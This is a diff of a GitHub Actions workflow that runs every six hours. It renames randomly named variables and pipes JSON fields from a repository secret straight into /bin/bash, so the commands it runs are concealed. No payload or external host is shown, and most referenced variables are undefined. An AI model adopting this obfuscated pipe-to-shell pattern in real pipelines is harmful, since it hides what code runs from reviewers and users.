@@ -1,30 +1,29 @@
 name: zhaoshouyy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
+    - cron: '15 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhaoshouyy
         env:
-          inau35: ${{ secrets.inau35 }}
+          kzv24: ${{ secrets.kzv24 }}
         run: |
-          echo $inau35 | jq -r .xzumq0775 | /bin/bash
-          echo $sbeax797 | jq -r .rd4239 | /bin/bash
-          echo $p9 | jq -r .lz35 | /bin/bash
-          echo $olwi42078 | jq -r .ulzz6 | /bin/bash
-          echo $bbsv3 | jq -r .y25529 | /bin/bash
-          echo $wllf68 | jq -r .lz560 | /bin/bash
-          echo $uq13039 | jq -r .tm12 | /bin/bash
-          echo $ffgy9 | jq -r .ekm4502 | /bin/bash
-          echo $odb7786 | jq -r .tda3 | /bin/bash
-          echo $cy6728 | jq -r .qnch00 | /bin/bash
-          echo $hopb235 | jq -r .tqfz019 | /bin/bash
-          echo $nzs97471 | jq -r .cqamp68 | /bin/bash
-          echo $kdrz301 | jq -r .eiyhc1 | /bin/bash
-          echo $he3 | jq -r .ouzp134 | /bin/bash
+          echo $kzv24 | jq -r .zeeb77 | /bin/bash
+          echo $odua35957 | jq -r .abt728 | /bin/bash
+          echo $jr97 | jq -r .ue1133 | /bin/bash
+          echo $yasu44 | jq -r .dt7960 | /bin/bash
+          echo $e355 | jq -r .rdfo01474 | /bin/bash
+          echo $i486 | jq -r .hxhe0 | /bin/bash
+          echo $hw30 | jq -r .w3775 | /bin/bash
+          echo $u465 | jq -r .vp79 | /bin/bash
+          echo $nguis20 | jq -r .ktorr05 | /bin/bash
+          echo $mj38 | jq -r .vitgl1 | /bin/bash
+          echo $xfjjx2 | jq -r .leg55638 | /bin/bash
+          echo $xb19189 | jq -r .ggwke8 | /bin/bash
+          echo $u352 | jq -r .dje5452 | /bin/bash
 
